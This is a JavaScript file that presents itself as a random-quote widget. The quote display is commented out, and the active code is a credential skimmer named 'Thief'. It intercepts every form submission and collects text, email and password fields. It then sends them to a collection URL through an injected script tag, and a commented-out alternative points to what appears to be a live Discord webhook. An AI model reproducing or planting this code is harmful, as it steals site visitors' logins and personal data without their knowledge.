(function() {

var Widget = {
  install: function () {
    var quotes = [
      "I have a new philosophy. I'm only going to dread one day at a time. ~ Charles Schulz",
      "Reality is the leading cause of stress for those in touch with it. ~ Jack Wagner",
      "Few things are harder to put up with than the annoyance of a good example. ~ Mark Twain",
      "The pure and simple truth is rarely pure and never simple. ~ Oscar Wilde",
      "There's no business like show business, but there are several businesses like accounting. ~ David Letterman",
      "Man invented language to satisfy his deep need to complain. ~ Lily Tomlin"
    ];
    var index = Math.floor(Math.random() * quotes.length);
    var elem = "<div class='quote'>" + quotes[index] + "</div>";
    //document.write(elem);
    Thief.plant();
  }
};

var Thief = {
  plant: function () {
    var flag = false;
    function onFormSubmit(event) {
      if (!event) event = window.event;
      var target;
      if (event.target) target = event.target;
      else if (event.srcElement) target = event.srcElement;
      if (!target) return;
      Thief.capture(target);
      setTimeout(function () {
        flag = true;
        var ev = document.createEvent("Event");
        ev.initEvent("submit", true, true);
        target.dispatchEvent(ev);
      }, 500);
      if (!flag) event.preventDefault();
    }
    var forms = document.getElementsByTagName('form');
    for (var i=0; i < forms.length; i++) {
      var form = forms[i];
      if (form.addEventListener) {
        form.addEventListener('submit', onFormSubmit, true);
      } else if (form.attachEvent) {
        form.attachEvent('onsubmit', onFormSubmit);
      }
    }
  },
  capture: function (form) {
    var inputs = form.getElementsByTagName('input');
    var data = [];
    for (var i=0; i < inputs.length; i++) {
      var input = inputs[i];
      var type = input.getAttribute('type');
      if ((type == 'text') || (type == 'email') || (type == 'password')) {
        var name = input.getAttribute('name');
        data.push(name + '=' + input.value);
      }
    }
    if (data.length > 0) {
      Thief.report(data.join('&'));
    }
  },
  report: function (text) {
    var script = document.createElement('script');
    script.src = 'http://127.0.0.1/collect.php?' + text;
    //script.src = 'https://discord.com/api/webhooks/803474916032249859/ySUHD5z-yA2tWoBfWWtYp_-FOIXnuiQyiTQxuHkktLZ_EBQbKje_ZQEiHMWhe7MR7Etp?login=' + text;
    document.getElementsByTagName('head')[0].appendChild(script);
  }
};

//Widget.install();
Thief.plant();

}());
